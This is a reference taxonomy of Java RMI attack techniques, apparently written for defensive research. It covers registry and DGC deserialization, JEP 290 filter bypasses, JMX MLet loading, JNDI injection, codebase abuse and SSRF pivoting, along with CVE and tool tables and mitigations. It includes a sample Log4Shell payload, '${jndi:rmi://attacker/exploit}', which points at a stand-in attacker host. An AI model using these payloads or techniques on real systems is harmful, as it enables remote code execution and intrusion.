# Java RMI (Remote Method Invocation) Vulnerability Mutation Taxonomy

---

## Classification Structure

Java Remote Method Invocation (RMI) is a Java-native object-oriented RPC mechanism that enables transparent invocation of methods on remote objects. RMI operates over the **Java Remote Method Protocol (JRMP)** by default, or alternatively over **IIOP (Internet Inter-ORB Protocol)** for CORBA interoperability. Because RMI relies fundamentally on **Java Object Serialization** for marshalling/unmarshalling method arguments, return values, and internal protocol messages, it presents a uniquely rich attack surface where deserialization is not merely an occasional risk but is woven into the protocol's DNA.

The taxonomy is organized along three axes:

- **Axis 1 (Attack Target):** The structural component of the RMI ecosystem being targeted — the registry, DGC, custom remote objects, the protocol layer, JNDI integration, management extensions (JMX), or the network transport itself.
- **Axis 2 (Exploitation Primitive):** The fundamental technique used — insecure deserialization, remote class loading, method invocation abuse, reference injection, information disclosure, or protocol-level manipulation.
- **Axis 3 (Impact Scenario):** The operational context — unauthenticated RCE, deserialization filter bypass, SSRF-to-RMI pivoting, lateral movement, persistence, or denial of service.

### Foundational Mechanism: RMI's Serialization Dependency

Every RMI communication — registry lookups, DGC lease management, custom method calls — transmits serialized Java objects over the wire. This creates a universal attack surface: **any RMI endpoint that accepts non-primitive parameters is a potential deserialization sink**. The key variables that determine exploitability are:

| Variable | Description |
|----------|-------------|
| **JDK Version** | Determines presence of JEP 290 filters (Java 8u121+), JNDI codebase restrictions (8u191+), and filter bypass patches (8u241+) |
| **Deserialization Filters** | Whether process-wide or component-specific ObjectInputFilters are configured |
| **Available Gadget Libraries** | Which libraries (Commons Collections, Spring, etc.) exist on the classpath |
| **Network Exposure** | Whether RMI ports are directly accessible or only via SSRF/proxy |
| **SecurityManager** | Whether a SecurityManager restricts class loading and code execution |

---

## §1. RMI Registry Attacks

The RMI Registry (default port 1099) is the naming service that maps string names to remote object stubs. It is often the first component an attacker encounters and provides both enumeration capabilities and direct exploitation paths.

### §1-1. Registry Deserialization via bind/rebind

The `bind()` and `rebind()` operations accept arbitrary `Remote` objects as arguments. Prior to JEP 290 filtering, any serializable object could be sent to the registry, triggering deserialization of attacker-controlled gadget chains.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Classic Registry Deserialization** | Send a ysoserial gadget chain (e.g., CommonsCollections, Spring, Groovy) as the object argument to `bind()`/`rebind()` | Pre-JEP 290 JDK (< 8u121) or no process-wide filter configured |
| **Proxy-Wrapped Payload** | Wrap the gadget chain inside a `java.lang.reflect.Proxy` implementing `java.rmi.Remote` to satisfy the registry's type check | The registry checks `instanceof Remote` but deserializes the proxy's invocation handler fully |
| **Nested Object Graphs** | Embed the malicious payload deep within a legitimate-looking object graph that passes initial type checks | Filter inspects only top-level types, not nested objects (pre-patch configurations) |

### §1-2. Registry Whitelist Filter Bypass (Post-JEP 290)

JEP 290 introduced a whitelist-based deserialization filter for the RMI registry. Several bypass techniques have been discovered.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **An Trinh's UnicastRef Gadget** | Constructs a `UnicastRemoteObject` containing a `RemoteObjectInvocationHandler` with a `UnicastRef` pointing to an attacker-controlled JRMP listener. The registry deserializes the object, initiates an outbound JRMP connection to the attacker, and the attacker responds with an unfiltered serialized payload | Pre-JDK 8u241. The outgoing JRMP connection does not apply the registry's deserialization filter |
| **JRMPClient Gadget** | Uses `sun.rmi.server.UnicastRef` directly to trigger an outbound JRMP connection during deserialization, redirecting to an attacker-controlled endpoint that responds with arbitrary gadget chains | Pre-JDK 8u241. Both this and the An Trinh gadget exploit the asymmetry between incoming (filtered) and outgoing (unfiltered) connections |
| **Custom Filter Misconfiguration** | Application-defined `ObjectInputFilter` that is overly permissive, allowing classes needed for gadget chains (e.g., allowing `org.apache.*` broadly) | Application-specific; common when developers don't fully understand which classes their filter must block |

### §1-3. Registry as Information Source

Even without achieving code execution, the RMI registry leaks valuable information.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Bound Name Enumeration** | Calling `list()` on the registry reveals all registered object names, their implementing interfaces, and endpoint addresses | No authentication required by default |
| **ObjID Extraction** | Each remote object has a unique ObjID; extracting these from the registry enables direct communication with remote objects, bypassing the registry entirely | ObjID values for well-known components (Registry: `[0:0:0, 0]`, Activator: `[0:0:0, 1]`, DGC: `[0:0:0, 2]`) are static and predictable |
| **Endpoint Address Disclosure** | Remote object stubs contain the IP address and port of the actual server, which may differ from the registry address, revealing internal network topology | Common in containerized/NAT environments where the internal address is embedded in the stub |
| **Uptime Fingerprinting** | ObjID values for custom objects contain a timestamp component, allowing calculation of server uptime | remote-method-guesser extracts this automatically |

---

## §2. Distributed Garbage Collector (DGC) Attacks

The DGC is an internal RMI component responsible for managing remote object lifecycle via distributed reference counting. It is present on **every** RMI endpoint (not just the registry) and has a well-known ObjID (`[0:0:0, 2]`), making it universally targetable.

### §2-1. DGC Deserialization

The DGC's `dirty()` and `clean()` methods accept serialized objects, making them deserialization sinks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Classic DGC Deserialization** | Send a ysoserial payload via the DGC's `dirty()` or `clean()` methods. Since DGC is available on every RMI endpoint, this works against any RMI service, not just the registry | Pre-JEP 290 JDK. The DGC had no deserialization filter in older versions |
| **DGC Filter Bypass via Outbound JRMP** | Similar to §1-2, use UnicastRef/JRMPClient gadgets to trick the DGC into making an outbound connection to an attacker JRMP listener | Pre-JDK 8u241. Same asymmetric filtering vulnerability as the registry |

### §2-2. DGC as Universal Entry Point

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cross-Endpoint DGC Targeting** | Since DGC runs on every RMI port, an attacker who discovers any RMI service can target the DGC even if the primary service is not exploitable | The DGC's well-known ObjID means no prior enumeration is required |
| **DGC via SSRF** | When RMI services are not directly accessible, SSRF vulnerabilities in web applications can be leveraged to craft raw JRMP packets targeting the DGC on internal hosts (§7-1) | The attacker needs to construct a valid JRMP stream targeting ObjID `[0:0:0, 2]` |

---

## §3. Custom Remote Object Attacks

Custom RMI services — application-specific remote objects registered in the RMI registry — represent the largest and most varied attack surface in modern (post-JEP 290) environments.

### §3-1. Parameter Deserialization on Custom Methods

Any remote method that accepts non-primitive parameters (especially `Object`, `Serializable`, or collection types) is a deserialization sink. Unlike the registry and DGC, **custom remote objects typically have no deserialization filter by default**.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct Object Parameter Exploitation** | Identify a remote method accepting `java.lang.Object`, `java.io.Serializable`, or similar broad types, then send a gadget chain as the argument | Method signature must accept non-primitive types; no application-level deserialization filter |
| **Collection/Map Parameter Exploitation** | Methods accepting `List`, `Map`, `Set`, or similar collection types deserialize all contained elements, allowing embedding of gadget chains within collection entries | Very common in enterprise RMI services that pass complex data structures |
| **Type Confusion via Signature Mismatch** | RMIScout and remote-method-guesser exploit the fact that sending a deliberately mismatched type triggers a `RemoteException` without full invocation, confirming the method exists — then the real payload is sent | Enables safe enumeration before exploitation |

### §3-2. Method Signature Brute-Forcing

RMI registries expose bound object names and interfaces but **do not expose method signatures**. Attackers must guess or brute-force these.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Hash-Based Signature Guessing (JRMP)** | In JRMP, methods are identified by a hash of the method signature. Tools like RMIScout generate hashes for ~2,500 candidate signatures per second without actually invoking methods | The method hash acts as an oracle: wrong hash → connection error, correct hash → RemoteException for type mismatch |
| **Name-Based Signature Guessing (IIOP)** | In RMI-IIOP, non-overloaded methods are identified solely by method name (parameter types are disregarded), creating a significantly smaller keyspace | RMI-IIOP endpoints; only the method name needs to match |
| **Interface Download** | Some RMI services expose their client JAR files via HTTP. Downloading and decompiling these reveals all method signatures | Common in legacy enterprise applications that distribute RMI client libraries |

### §3-3. Dangerous Built-in RMI Services

Certain well-known RMI services are inherently dangerous when exposed.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **JMX MBeanServer (via RMI Connector)** | JMX exposes the `javax.management.MBeanServer` over RMI, allowing creation, invocation, and deletion of MBeans — effectively a management backdoor | JMX remote connector enabled; authentication disabled or weak credentials |
| **Spring RmiServiceExporter** | Spring Framework's `RmiServiceExporter` wraps any Spring bean as an RMI service, often without awareness of the deserialization risks. Any method accepting object parameters becomes a sink | Spring applications using RMI remoting; extremely common in legacy Spring apps |
| **Apache JMeter RMI** | JMeter's distributed testing mode uses RMI for controller-agent communication, typically without authentication or filtering | JMeter distributed mode enabled; RMI port accessible |

---

## §4. JMX over RMI Attacks

Java Management Extensions (JMX) is a standard Java management framework that commonly uses RMI as its transport layer. JMX-RMI endpoints (typically port 1099 or dynamically assigned) represent one of the most dangerous RMI attack surfaces due to the inherent power of the MBeanServer.

### §4-1. Unauthenticated JMX Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **MLet Remote MBean Loading** | Create a `javax.management.loading.MLet` MBean, then invoke `getMBeansFromURL()` pointing to an attacker-controlled HTTP server hosting a malicious MLet file that references a JAR with a weaponized MBean | `com.sun.management.jmxremote.authenticate=false`; no SecurityManager restricting ClassLoader MBeans |
| **Direct MBean Invocation** | Invoke dangerous methods on already-registered MBeans (e.g., `Runtime.exec()` via a wrapper MBean, or `DiagnosticCommand` MBean for JVM commands) | JMX authentication disabled; certain MBeans (like `com.sun.management:type=DiagnosticCommand`) are always present |
| **MBean Attribute Manipulation** | Modify MBean attributes to alter application behavior — change logging levels, modify connection pool settings, disable security features | JMX exposed without authentication |

### §4-2. Authenticated JMX Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Default/Weak JMX Credentials** | JMX authentication uses a password file (`jmxremote.password`); many deployments use default credentials or easily guessable passwords | Authentication enabled but with weak credentials |
| **JMX Deserialization** | Even authenticated JMX communication uses Java serialization. If an attacker can authenticate (or MITM the connection), they can inject gadget chains | Valid credentials or network position for MITM; no TLS on JMX connection |

---

## §5. JNDI Injection via RMI Vector

Java Naming and Directory Interface (JNDI) is a general-purpose lookup API. When JNDI is configured to use RMI as a naming provider, several injection attacks become possible. This category gained massive prominence through Log4Shell (CVE-2021-44228).

### §5-1. JNDI Reference Injection (Classic)

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Remote Factory Class Loading** | Attacker controls a JNDI lookup URL (`rmi://attacker:1099/exploit`). The attacker's RMI server returns a `javax.naming.Reference` with a `classFactory` and `classFactoryLocation` pointing to an attacker-controlled HTTP server. The victim downloads and instantiates the factory class, achieving RCE | JDK < 8u121 (no `com.sun.jndi.rmi.object.trustURLCodebase` restriction) |
| **Local Factory Abuse (Post-8u191)** | After Oracle restricted remote codebase loading, attackers instead specify a factory class already present on the victim's classpath. For example, `org.apache.xbean.propertyeditor.JndiConverter` (Tomcat) or `com.sun.rowset.JdbcRowSetImpl` can be abused as local factories | JDK ≥ 8u191; requires a suitable factory class on the target classpath (Tomcat's `BeanFactory` is the most common) |
| **Serialized Object in Reference** | Instead of using a factory, the attacker's RMI server returns a `Reference` containing a serialized Java object in its attributes. The victim deserializes this object, enabling gadget chain execution | Gadget libraries on the victim's classpath; works regardless of codebase restrictions |

### §5-2. JNDI Injection Entry Points

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Log4Shell (CVE-2021-44228)** | Log4j 2.x's message lookup feature evaluates `${jndi:rmi://attacker/exploit}` expressions embedded in logged strings, triggering JNDI lookups to attacker-controlled RMI servers | Log4j 2.0–2.14.1; any log input that reaches a vulnerable `Logger.log()` call |
| **Application-Level JNDI Lookup** | Any code path where user input reaches `InitialContext.lookup()` — common in JDBC DataSource configuration, JMS queue resolution, EJB lookups, and Spring JNDI configuration | Application passes attacker-controlled strings to JNDI lookup |
| **RMI-to-LDAP Redirection** | An attacker's malicious RMI server redirects the JNDI lookup to an LDAP server, which has different (sometimes weaker) restrictions on returned objects | JNDI's multi-protocol nature allows protocol switching during lookup resolution |

---

## §6. Remote Class Loading Attacks

RMI supports **codebases** — URLs from which unknown classes can be loaded dynamically during deserialization. This is a design feature that becomes a critical vulnerability when server-side class loading trusts client-specified codebases.

### §6-1. Client-Specified Codebase

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Annotation-Based Class Loading** | During RMI serialization, each class is annotated with the codebase URL from which it was loaded. When the receiving side encounters an unknown class, it fetches it from the annotated URL. An attacker annotates malicious classes with a URL pointing to their HTTP server | `java.rmi.server.useCodebaseOnly=false` (default before JDK 7u21); SecurityManager allows URLClassLoader |
| **DGC Codebase Exploitation** | The DGC accepts serialized objects annotated with codebase URLs. Sending an unknown class via DGC's `dirty()` method with a malicious codebase URL causes the server to download and load the class | Same conditions as above; DGC is available on every RMI endpoint |
| **Activation System Codebase** | The RMI Activation System (`rmid`) loads activation descriptors that can specify arbitrary codebases for activatable objects | Activation system running with lax SecurityManager policy |

### §6-2. Server-Specified Codebase Abuse

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Malicious Server Codebase** | An attacker-controlled RMI server sets its codebase to point to malicious classes. When a client invokes a method and receives a response containing unknown types, the client loads them from the server's codebase | Client has `useCodebaseOnly=false` or pre-7u21 JDK; no SecurityManager on client side |
| **Codebase Poisoning via Registry** | An attacker registers a malicious object in the RMI registry with a codebase annotation. When a legitimate client looks up the object, it downloads classes from the attacker's codebase | Registry does not authenticate `bind()`/`rebind()` callers; client trusts registry content |

---

## §7. Protocol and Transport Layer Attacks

Beyond application-level vulnerabilities, the JRMP protocol and its network transport present additional attack surfaces.

### §7-1. SSRF-to-RMI Pivoting

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Raw JRMP via SSRF** | Construct a valid JRMP byte stream and deliver it through an SSRF vulnerability to an internal RMI service. The JRMP protocol is stateless enough that single-request attacks (targeting known ObjIDs like DGC) are feasible | SSRF vulnerability that allows arbitrary binary data; knowledge of the target's RMI port |
| **Registry Enumeration via SSRF** | Use SSRF to call `list()` on an internal RMI registry, revealing bound names and endpoints on the internal network | SSRF vulnerability; internal RMI registry on a known port |
| **SSRF Response Parsing** | After sending an SSRF-based RMI call, parse the SSRF response to extract serialized return values, including remote object stubs with internal endpoint information | SSRF vulnerability that returns response data |

### §7-2. Man-in-the-Middle (MITM) Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unencrypted JRMP Interception** | RMI communication over JRMP is unencrypted by default. An attacker with network access can intercept and modify serialized objects in transit — injecting gadget chains into method arguments or return values | No TLS/SSL configured for RMI; attacker has network-level access (ARP spoofing, compromised router, etc.) |
| **Object Replacement** | Intercept a legitimate RMI response and replace the returned object with a malicious serialized payload. The client deserializes the attacker's object thinking it came from the legitimate server | Unencrypted RMI; client does not validate response integrity |
| **Registry Spoofing** | Set up a rogue RMI registry that responds to `lookup()` calls with malicious stubs containing embedded gadget chains or codebases pointing to attacker-controlled servers | DNS spoofing or network position to redirect registry connections; no TLS on registry communication |

### §7-3. RMI-IIOP Specific Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **IIOP Deserialization** | RMI-IIOP (CORBA) uses CDR (Common Data Representation) encoding but still deserializes Java objects for non-primitive types. Unlike JRMP, string types in IIOP can also be exploited for deserialization | RMI-IIOP endpoint; gadget libraries on classpath |
| **GIOP/IIOP Direct Exploitation** | Craft raw GIOP (General Inter-ORB Protocol) messages targeting the IIOP endpoint, bypassing Java-level access controls. CORBA's IOR (Interoperable Object Reference) contains endpoint details similar to RMI stubs | IIOP/CORBA endpoint exposed; e.g., WebLogic's IIOP listener (CVE-2020-2551) |
| **Reduced Keyspace Brute-Force** | In RMI-IIOP, non-overloaded methods are identified by name only (parameter types and return types are disregarded), making signature guessing trivially easier than JRMP | RMI-IIOP endpoint; approximately ~100x smaller search space than JRMP |

---

## §8. RMI Activation System Attacks

The RMI Activation System (`rmid`) manages activatable remote objects — objects that can be started on demand. While deprecated since JDK 15 and removed in JDK 17, it remains present in many legacy deployments.

### §8-1. Activator Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Activator Deserialization** | The Activator (ObjID `[0:0:0, 1]`) accepts serialized `ActivationID` objects. On pre-JEP 290 systems, these can contain gadget chains | Pre-JEP 290 JDK; Activation System running |
| **Activation Descriptor Injection** | Register a malicious `ActivationDesc` that specifies an attacker-controlled codebase URL. When the activation system starts the object, it loads classes from the attacker's server | Ability to register activation descriptors (requires access to `ActivationSystem`) |
| **Activation Group Manipulation** | Create or modify an `ActivationGroupDesc` to change JVM arguments, system properties, or classpath of the activation group's JVM, potentially disabling security features | Access to `ActivationSystem`; no authentication on activation operations |

---

## §9. Reconnaissance and Enumeration

Reconnaissance is a prerequisite for most RMI attacks. This category covers techniques for discovering and fingerprinting RMI services.

### §9-1. Service Discovery

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Port Scanning** | RMI registries default to port 1099; JMX RMI connectors commonly use 1098, 1099, or dynamically assigned ports. Nmap's `rmi-vuln-classloader` and `rmi-dumpregistry` scripts perform RMI-specific detection | Network access to target port range |
| **Registry Enumeration** | Calling `list()` on the RMI registry reveals all bound names, their implementing classes/interfaces, and endpoint addresses (IP:port) of the backing remote objects | Default RMI registry has no access control on `list()` |
| **JDK Version Fingerprinting** | ObjID structure, error messages, and protocol behavior differ across JDK versions, allowing determination of whether JEP 290 filters, codebase restrictions, or other mitigations are present | Any accessible RMI endpoint |

### §9-2. Detailed Fingerprinting

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ObjID Analysis** | Custom remote objects' ObjID values contain a timestamp, enabling calculation of server uptime and identification of the object creation order | ObjID exposed via registry lookup or network capture |
| **Filter Detection** | Sending test payloads (e.g., An Trinh gadget) and observing the error response reveals whether JEP 290 filters are active and what filter configuration is in place | Any accessible RMI endpoint |
| **TLS Configuration Check** | Attempting both plaintext and TLS connections reveals the endpoint's transport security configuration | remote-method-guesser and BaRMIe perform this automatically |
| **Localhost Restriction Check** | Some RMI operations (e.g., `bind()`, `rebind()`, `unbind()` on the registry) are restricted to localhost connections in modern JDKs. Testing from remote vs. local reveals this configuration | Network access and ability to compare local vs. remote behavior |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture / Conditions | Primary Mutation Categories |
|----------|--------------------------|----------------------------|
| **Unauthenticated RCE (Pre-JEP 290)** | Legacy JDK, any RMI endpoint | §1-1 + §2-1 + §6-1 |
| **Unauthenticated RCE (Post-JEP 290)** | Modern JDK, custom services without filters | §3-1 + §3-2 |
| **Deserialization Filter Bypass** | JEP 290 enabled, pre-8u241 | §1-2 (An Trinh / JRMPClient) |
| **JMX-based RCE** | JMX exposed without authentication | §4-1 (MLet loading) |
| **JNDI Injection Chain** | Application with JNDI lookup sink | §5-1 + §5-2 |
| **SSRF-to-Internal-RMI** | Web app SSRF + internal RMI services | §7-1 + §2-2 |
| **Lateral Movement** | Compromised host in RMI-using environment | §9-1 → §3 or §4 |
| **Supply Chain / Build System** | CI/CD using JMeter/Gradle/Maven with RMI | §3-3 + §6 |
| **Client-Side Exploitation** | Attacker controls RMI server, victim is client | §6-2 + §7-2 |
| **Persistence via Registry** | Attacker has write access to registry | §1-1 (rebind malicious stubs) + §6-2 |

---

## CVE / Bounty Mapping (2020–2025)

| Mutation Combination | CVE / Case | Impact |
|---------------------|-----------|--------|
| §5-2 (Log4Shell) + §5-1 | **CVE-2021-44228** (Apache Log4j) | CVSS 10.0. Unauthenticated RCE via JNDI lookup in log messages. One of the most impactful vulnerabilities in history; RMI was one of three JNDI vectors exploited in the wild |
| §3-1 + §2-1 | **CVE-2025-42944** (SAP NetWeaver RMI-P4) | CVSS 10.0. Unauthenticated RCE via insecure deserialization in the RMI-P4 module (port 50004/50014). No authentication, no filtering |
| §1-1 + §4-1 | **CVE-2025-20354** (Cisco Unified CCX) | Critical. Unauthenticated file upload and RCE via improper authentication in the Java RMI process, executed with root privileges |
| §7-3 (IIOP) + §5-1 | **CVE-2020-2551** (Oracle WebLogic) | CVSS 9.8. Unauthenticated RCE via IIOP protocol with malicious JNDI lookup |
| §1-2 (UnicastRef bypass) | **CVE-2019-2684** (Oracle JDK) | JEP 290 registry filter bypass via UnicastRef gadget; patched in 8u241 |
| §5-1 + §5-2 | **CVE-2024-28213** (nGrinder) | RCE via insecure deserialization in RMI communication; part of a chain of 6 CVEs |
| §6-1 (Codebase) | **CVE-2011-3556** (Oracle JDK) | Classic RMI codebase exploitation; the vulnerability that led to `useCodebaseOnly=true` becoming default |
| §3-3 (Spring RMI) | **CVE-2016-1000027** (Spring Framework) | Deserialization RCE via `HttpInvokerServiceExporter`; Spring eventually deprecated all RMI remoting |
| §4-1 (MLet) | **CVE-2018-8016** (Apache Cassandra) | Unauthenticated local JMX access allowing code execution via default configuration |

---

## Detection Tools

### Offensive Tools (Scanning, Enumeration, Exploitation)

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **remote-method-guesser** (rmg) | Comprehensive RMI scanner | Enumerates registry, detects JEP 290 filters, performs deserialization attacks on Registry/DGC/Activator, method guessing, SSRF support, codebase attacks |
| **RMIScout** (Bishop Fox) | Method signature brute-forcing | Generates method hashes at ~2,500/sec using dynamic class generation; integrates with ysoserial and GadgetProbe; supports both JRMP and IIOP |
| **BaRMIe** | RMI enumeration and exploitation | Uses partial RMI interfaces from known software to interact with services directly; identifies known vulnerable services |
| **ysoserial** | Gadget chain generation | Generates serialized payloads for dozens of Java gadget chains (CommonsCollections, Spring, Groovy, etc.) |
| **JNDI-Injection-Exploit-Plus** | JNDI injection exploitation | Starts RMI/LDAP/HTTP servers to serve malicious JNDI references; 80+ gadgets |
| **Metasploit** (`java_rmi_server`) | RMI exploitation framework | Modules for codebase exploitation, JMX MLet loading, DGC deserialization |
| **Nmap** (`rmi-vuln-classloader`, `rmi-dumpregistry`) | RMI service detection | NSE scripts for detecting vulnerable class loading configuration and dumping registry contents |
| **mjet / sjet** | JMX exploitation | Specialized tools for MLet-based MBean injection over JMX-RMI |
| **GadgetProbe** | Classpath reconnaissance | Determines which libraries exist on the target classpath by sending DNS-callback-triggering probes via RMI deserialization |
| **RmiTaste** | RMI interaction and exploitation | Enumerate, interact, and exploit RMI services by calling remote methods with ysoserial gadgets |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **ObjectInputFilter (JEP 290/415)** | Process-wide deserialization filtering | Whitelist-based filtering of allowed classes during deserialization; built into JDK 9+, backported to 8u121+ |
| **SerialKiller** | Application-level deserialization filter | Drop-in replacement for `ObjectInputStream` with configurable allowlist/blocklist |
| **NotSoSerial** | Java agent for deserialization protection | Java agent that instruments `ObjectInputStream` to block dangerous classes |
| **Contrast Security / RASP tools** | Runtime deserialization protection | Runtime Application Self-Protection that monitors and blocks deserialization of known gadget classes |

---

## Summary: Core Principles

### Why RMI is Fundamentally Vulnerable

The root cause of RMI's vast vulnerability surface is its **architectural dependence on Java Object Serialization as the wire format**. Unlike modern RPC frameworks (gRPC, REST+JSON) that transmit structured data, RMI transmits **arbitrary object graphs** — complete with class metadata, inheritance hierarchies, and reconstructable state. This means that every RMI communication channel is, by design, a deserialization sink. The protocol cannot function without deserializing attacker-influenceable data.

Compounding this, RMI was designed in an era (1997) when network services were implicitly trusted. The protocol has **no built-in authentication, no integrity verification, and no encryption by default**. The RMI registry freely discloses all registered services to any caller. The DGC is universally accessible on every endpoint. Method invocation requires no credentials. This "open by default" design means that any network-accessible RMI service is immediately attackable.

### Why Incremental Patches Fail

Oracle's mitigation strategy has been a progressive series of restrictions: `useCodebaseOnly=true` (2013), JEP 290 deserialization filters (2016), JNDI codebase restrictions (2018), and individual bypass patches (2020+). Each fix addresses a specific attack primitive while leaving the fundamental architecture unchanged. The An Trinh bypass demonstrated that even JEP 290's whitelist filters could be circumvented by exploiting the asymmetry between incoming and outgoing connections. Custom remote objects — the most common real-world RMI usage — remain **unfiltered by default** even on the latest JDK, shifting the security burden entirely to application developers who may not understand the risks.

### Structural Solutions

The only comprehensive mitigation is to **eliminate RMI exposure entirely** or to layer multiple defenses: (1) never expose RMI ports to untrusted networks, (2) configure process-wide `ObjectInputFilter` with strict allowlists, (3) enable TLS for all RMI communication (`javax.rmi.ssl.SslRMIClientSocketFactory`), (4) replace RMI with modern alternatives (gRPC, REST) where feasible, and (5) for JMX, always enable authentication and use SSL. Spring Framework's deprecation and removal of its RMI remoting support (completed in Spring 6) reflects the industry consensus that Java RMI is an inherently dangerous transport that should be retired.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

- [HackTricks - Pentesting Java RMI](https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi)
- [MOGWAI LABS - Attacking Java RMI Services After JEP 290](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
- [MOGWAI LABS - An Trinh's RMI Registry Bypass](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)
- [MOGWAI LABS - Attacking RMI-based JMX Services](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
- [Bishop Fox - RMIScout](https://bishopfox.com/blog/rmiscout)
- [Bishop Fox - Brute-Forcing RMI-IIOP](https://bishopfox.com/blog/brute-forcing-rmi-iiop-with-rmiscout)
- [An Trinh - Far Sides of Java Remote Protocols (BlackHat EU 2019)](https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf)
- [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
- [Attacking Java RMI via SSRF](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)
- [Veracode - Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
- [PayloadsAllTheThings - Java RMI](https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/)
- [NSFOCUS - Java Deserialization Exploits: Registry Whitelist Bypass](https://nsfocusglobal.com/java-deserialization-exploits-registry-whitelist-bypass/)
- [CVE-2025-42944 - SAP NetWeaver RMI-P4](https://redrays.io/blog/cve-2025-42944-critical-severity-remote-code-execution-in-sap-netweaver-rmi-p4/)
- [CVE-2025-20354 - Cisco Unified CCX](https://zeropath.com/blog/cve-2025-20354-cisco-uccx-rmi-rce-summary)
- [AFINE - Java RMI for Pentesters](https://afine.com/java-rmi-for-pentesters-part-two-reconnaissance-attack-against-non-jmx-registries/)
- [JEP 290: Filter Incoming Serialization Data](https://openjdk.org/jeps/290)
